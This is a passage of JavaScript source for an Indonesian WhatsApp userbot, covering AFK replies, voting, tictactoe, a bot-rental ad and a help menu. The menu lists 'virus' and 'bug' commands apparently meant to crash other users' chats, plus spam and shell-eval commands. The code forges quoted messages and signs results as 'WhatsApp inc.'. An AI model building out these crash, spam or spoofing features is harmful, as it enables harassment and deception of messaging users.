if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply(`Njier jangan pake fake trolli ${enter}${enter}` + require('util').format(m.key))
await alpha.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!${enter}${enter}*Alasan :* ${alasan}${enter}*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu${enter}${enter}Silahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "OFFLINE", 'jpegThumbnail': thumbnail}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!${enter}${enter} *Alasan :* ${alasan}${enter}*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu${enter}${enter}Silahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "OFFLINE", 'jpegThumbnail': thumbnail}}}})
          }
        }
            }
          }
        }
      }
    }
// Auto Read Group 
var chats = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await alpha.chatRead(jid)
})
// Auto Read Private 
var chatss = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await alpha.chatRead(jid)
})
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6281804680327@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	
// function for get the winner
const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		alpha.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}
function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
		    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptimer = clockString(_uptime);
      await alpha.setStatus(`I'M USERBOT 🤖 | RUNTIME ${uptimer} ⏰ | ${status}`).catch((_) => _);
      settingstatus = new Date() * 1;

    }    
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = type === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	if (!mek.key.fromMe && !isOwner && banChats === true) return
		const isBtMsg = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
const isStMsg = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
sub_yt_zeeone_ofc = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
subscribezeeoneofc = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
if (subscribezeeoneofc == 'welcomenya') {
	reply(`Welcome buat yang gabung😊
 Semoga betah ya kak dan patuhi rules grub kami :)`)
	}
if (subscribezeeoneofc == 'leavenya') {
	reply(`Sayonara buat yang pergi😔
 Semoga amal ibadahnya di terima :)`)
	}
if (subscribezeeoneofc == 'instagramku') {
	reply(`Nih ${pushname} IG ownerku Follow ya ☕\n\n${ig_lu}`)
	}
if (subscribezeeoneofc == 'ytku') {
	reply(`Nih ${pushname} YT ownerku subscribe ya ☕\n\n${yt_lu}`)
	}
if (subscribezeeoneofc == 'ownerku') {
let ini_list = [] 
for (let i of ownerNumbers) {
const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
ini_list.push({
"displayName": `${creator}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await alpha.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa subscribe YT dan follow Instagram nya😇`
var buttonss = [
{buttonId: 'instagramku', buttonText:{displayText: 'IG'}, type: 1},
{buttonId: 'ytku', buttonText:{displayText: 'YT'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
}
if (subscribezeeoneofc == 'statiktiknya') {
teks = `\`\`\`「 ‣ 🇸 🇪 🇼 🇦  🇧 🇴 🇹 ❗ 」\`\`\`

┏━━ᚕPRICE LIST
┃❒PERMINGGU 5K 
┃❒PERBULAN 15K 
┃❒PERMANENT 20K
┗━ᚕ
┏━━ᚕKELEBIHAN BOT
┃❒ON 24 JAM 
┃❒WELCOME BUTTON
┃❒FITUR LANGKA
┃❒NO PASARAN 
┃❒SC SENDIRI
┗━ᚕ
┏━━ᚕKEUNTUNGAN
┃❒ANTILINK ON✓
┃❒WELCOME ON✓
┃❒ATTP ✓
┃❒STICKER ✓
┃❒TICTACTOE ✓
┃❒KICK ✓
┃❒ADD ✓
┗━ᚕ
┏━━ᚕMINAT? PM
┃❒wa.me/6281511751649
┃❒ IG @_hii.fauzan
┗━ᚕ
┏━━ᚕPAYMENT
┃❒GOPAY
┃❒QRIS ALL PAYMENT
┗━ᚕ`

teks =`┏━━ᚕPRICE LIST
┃❒PERMINGGU 5K 
┃❒PERBULAN 15K 
┃❒PERMANENT 20K
┗━ᚕ
┏━━ᚕKELEBIHAN BOT
┃❒ON 24 JAM 
┃❒WELCOME BUTTON
┃❒FITUR LANGKA
┃❒NO PASARAN 
┃❒SC SENDIRI
┗━ᚕ
┏━━ᚕKEUNTUNGAN
┃❒ANTILINK ON✓
┃❒WELCOME ON✓
┃❒ATTP ✓
┃❒STICKER ✓
┃❒TICTACTOE ✓
┃❒KICK ✓
┃❒ADD ✓
┗━ᚕ
┏━━ᚕMINAT? PM
┃❒wa.me/6281511751649
┃❒ IG @_hii.fauzan
┗━ᚕ
┏━━ᚕPAYMENT
┃❒GOPAY
┃❒QRIS ALL PAYMENT
┗━ᚕ`
reply (teks)
}
switch (command) {
case 'menu':
case 'help':
let wowo = fs.readFileSync(`./image/${thumbnail}`)
koko = `${targetpc}@s.whatsapp.net`
let contentt = fs.readFileSync(`./image/${thumbnail}`)
const media = await alpha.prepareMessage(from, contentt, MessageType.image, { thumbnail:fs.readFileSync(`./image/${thumbnail}`)})
let bacotlu = media.message["ephemeralMessage"] ? media.message.ephemeralMessage : media
let p1 = await alpha.getStatus(sender)
anunya = process.uptime()
ini_anu =`${ucapannya2} @${sender.split('@')[0]}

┏━━❒ *BOT INFO* 
┃
${petik}┃⬡ Creator : @${koko.split('@')[0]}
┃⬡ Powered  : @${ini_mark.split('@')[0]}
┃⬡ Mode : ${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}
┃⬡ Status : ${offline ? 'OFFLINE' : 'ONLINE'}
┃⬡ Prefix :  ${prefix}
┃⬡ Group Chat : ${totalgroup.length}
┃⬡ Private Chat : ${totalkontak.length}
┃⬡ Total Chat : ${totalchat.length}
┃⬡ Lib  : Baileys
┃⬡ Type  : NodeJs
┃⬡ Total hit : ${hitall}
┃⬡ Hit today : ${hit_today.length}
┃⬡ Speed : ${latensi.toFixed(4)} Second
┃⬡ Runtime : ${kyun(anunya)}
┃⬡ Battery : ${isBattre}
┃⬡ Charging : ${isCharge}${petik}
┗⬣

┏━━❒ *YOUR INFO*
┃
${petik}┃⬡ Name : ${pushname}
┃⬡ Bio : ${p1 ? `${p1.status}` : '-'}
┃⬡ Nomor : @${sender.split('@')[0]}
┃⬡ Me : ${mek.key.fromMe ? 'True' : 'False'}
┃⬡ Owner : ${isOwner ? 'True' : `False`}${petik}
┗⬣\n\n╭──「 📖  *Command* 」
│
├ ◪ *Virus & Bug Command*
│
${petik}│ ⤷ ${prefix}troli 
│ ⤷ ${prefix}bugpc
│ ⤷ ${prefix}bugpc2 [ jumlah ]
│ ⤷ ${prefix}bugtroli2 [ jumlah ]
│ ⤷ ${prefix}bugcombine
│ ⤷ ${prefix}bugtroli
│ ⤷ ${prefix}buglokasi
│ ⤷ ${prefix}virus1 [Katalog]
│ ⤷ ${prefix}virus2 [Katalog]
│ ⤷ ${prefix}virus3 [Katalog] 
│ ⤷ ${prefix}virus4 [Audio]${petik}
│
├ ◪ *Owner Command*
│
${petik}│ ⤷ ${prefix}setprefix <query>
│ ⤷ ${prefix}setmenu <query>
│ ⤷ ${prefix}setlink <query>
│ ⤷ ${prefix}leave <id>
│ ⤷ ${prefix}self 
│ ⤷ ${prefix}public 
│ ⤷ ${prefix}off <query>
│ ⤷ ${prefix}on [alasan]
│ ⤷ ${prefix}status 
│ ⤷ ${prefix}antibug <on/off>
│ ⤷ ${prefix}antitag <on/off>
│ ⤷ ${prefix}autoread <query>
│ ⤷ ${prefix}anticall <on/off>
│ ⤷ ${prefix}antidelete <on/off>
│ ⤷ ${prefix}join <link>
│ ⤷ ${prefix}restart ${petik}
│
├ ◪ *Group Command*
│
${petik}│ ⤷ ${prefix}antilink <1/0>
│ ⤷ ${prefix}setname <query>
│ ⤷ ${prefix}setdesc <query>
│ ⤷ ${prefix}groupinfo 
│ ⤷ ${prefix}revoke 
│ ⤷ ${prefix}linkgc 
│ ⤷ ${prefix}group <open/close>
│ ⤷ ${prefix}add <62xxxx>
│ ⤷ ${prefix}kick <reply>
│ ⤷ ${prefix}sider <reply>
│ ⤷ ${prefix}promote <reply>
│ ⤷ ${prefix}demote <reply>${petik}
│
├ ◪ *Maker Command*
│
${petik}│ ⤷ ${prefix}sticker <image/video>
│ ⤷ ${prefix}swm <author|packname>
│ ⤷ ${prefix}take <author|packname>
│ ⤷ ${prefix}fdeface 
│ ⤷ ${prefix}emoji <emoji>${petik}
│
├ ◪ *Convert Command*
│
${petik}│ ⤷ ${prefix}toimg <reply>
│ ⤷ ${prefix}tomp3 <reply>
│ ⤷ ${prefix}tomp4 <reply>
│ ⤷ ${prefix}slow <reply>
│ ⤷ ${prefix}fast <reply>
│ ⤷ ${prefix}reverse <reply>
│ ⤷ ${prefix}tourl <reply>${petik}
│
├ ◪ *Convert Command*
│
${petik}│ ⤷ ${prefix}upswteks <query>
│ ⤷ ${prefix}upswimage <image>
│ ⤷ ${prefix}upswvideo <video>${petik}
│
├ ◪ *Game Command*
│
${petik}│ ⤷ ${prefix}tictactoe <@tag>
│ ⤷ ${prefix}voting <@tag>
│ ⤷ ${prefix}cekhistory 
│ ⤷ ${prefix}delsesi <game>${petik}
│
├ ◪ *Fun Command*
│
${petik}│ ⤷ ${prefix}hbd <date>
│ ⤷ ${prefix}slander <query>
│ ⤷ ${prefix}slanderpm <query>
│ ⤷ ${prefix}kontak <62xxxx>
│ ⤷ ${prefix}styletext <query>
│ ⤷ ${prefix}photoxy <query>${petik}
│
├ ◪ *Tag Command*
│
${petik}│ ⤷ ${prefix}tag 
│ ⤷ ${prefix}tagall <query>
│ ⤷ ${prefix}hidetag <query>
│ ⤷ ${prefix}kontag 
│ ⤷ ${prefix}sticktag <reply>
│ ⤷ ${prefix}totag <reply>${petik}
│
├ ◪ *Download Command*
│
${petik}│ ⤷ ${prefix}ytsearch <query>
│ ⤷ ${prefix}playstore <query>
│ ⤷ ${prefix}igstalk <query>
│ ⤷ ${prefix}play <query>
│ ⤷ ${prefix}video <query>
│ ⤷ ${prefix}ytmp3 <link>
│ ⤷ ${prefix}ytmp4 <link>
│ ⤷ ${prefix}ig <link>
│ ⤷ ${prefix}twmp4 <link>
│ ⤷ ${prefix}twmp3 <link>
│ ⤷ ${prefix}ttmp4 <link>
│ ⤷ ${prefix}ttmp3 <link>
│ ⤷ ${prefix}fbmp4 <link>
│ ⤷ ${prefix}fbmp3 <link>
│ ⤷ ${prefix}brainly <query>
│ ⤷ ${prefix}image <query>
│ ⤷ ${prefix}anime${petik}
│
├ ◪ *Setting Command*
│
${petik}│ ⤷ ${prefix}setthumb <reply>
│ ⤷ ${prefix}settarget <62xxxx>
│ ⤷ ${prefix}setfakeimg <reply>
│ ⤷ ${prefix}setreply <query>${petik}
│
├ ◪ *Tools Command*
│
${petik}│ ⤷ ${prefix}getname <reply>
│ ⤷ ${prefix}getbio <reply>
│ ⤷ ${prefix}getpic 
│ ⤷ ${prefix}getp 
│ ⤷ ${prefix}get <link>
│ ⤷ ${prefix}q 
│ ⤷ ${prefix}inspect <link>
│ ⤷ ${prefix}searchtext <query>
│ ⤷ ${prefix}searchgc <query>
│ ⤷ ${prefix}detikvn <query>
│ ⤷ ${prefix}detikvideo <query>
│ ⤷ ${prefix}fliptext <query>
│ ⤷ ${prefix}volume <query>${petik}
│
├ ◪ *Other Command*
│
${petik}│ ⤷ ${prefix}blocklist [List]
│ ⤷ ${prefix}setcmd <query>
│ ⤷ ${prefix}delcmd [Delete]
│ ⤷ ${prefix}listcmd [List]
│ ⤷ ${prefix}spam <query>
│ ⤷ ${prefix}listgroup [List]
│ ⤷ ${prefix}size <query>
│ ⤷ ${prefix}ping [Ping]
│ ⤷ ${prefix}term <code>
│ ⤷ ${prefix}owner [Owner]
│ ⤷ ${prefix}deletepc${petik}
│
├ ◪ *Eval Command*
│
${petik}│ ⤷ ${prefix}=> [eval async]
│ ⤷ ${prefix}> [eval]
│ ⤷ ${prefix}$ <termux cmd>${petik}
│
╰──「 *Bless Botz* 」
`
if(menusimple == false){
	let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: fs.readFileSync(`image/${thumbnail}`)})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'ownerku', buttonText: {displayText: '🙇OWNER'}, type: 1},
  {buttonId: 'statiktiknya', buttonText:{displayText: '🤖SEWA BOT'}, type: 1}
]

const btn1 = {
    contentText: ini_anu,
    footerText: `${tampilTanggal}${enter}${tampilWaktu}${enter}${enter}Regard @${koko.split('@')[0]}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender,koko,ini_mark],
            },
			quoted: fkontak,sendEphemeral: true 
			})
	
} else if(menusimple = true){ 
await alpha.sendMessage(from, ini_anu , text,{
        thumbnail: fs.readFileSync(`image/${thumbnail}`),
        caption:'p',
        "contextInfo": {
            text: 'p',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "externalAdReply": {
                "title": `${ucapannya2} ${pushname}`,
                "body": `${baper}`,
                "previewType": "PHOTO",
                "thumbnailUrl": ``,
                "thumbnail": wowo,
                "sourceUrl": `${apiku}`
            }},
			quoted: mek})
} 

break
case 'setmenu':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
 if ((args[0]) == 'ori'){
menusimple = false
reply(`_Succses mengganti menu ke menu ori_`)
} else if((args[0]) == 'simple'){
menusimple = true
Mloc = false
reply(`_Succses mengganti menu ke menu simple_`)
} else {
reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
}
break
case 'antidelete':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antidel === true) return
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if (antical === false) return
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autoread':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply(`Example:${enter}${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:${enter}${prefix}autoread gc on`)
if (args[1] === "on") {
if (readG === true) return
readG = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:${enter}${prefix}autoread pc on`)
if (args[1] === "on") {
if (readP === true) return
readP = true
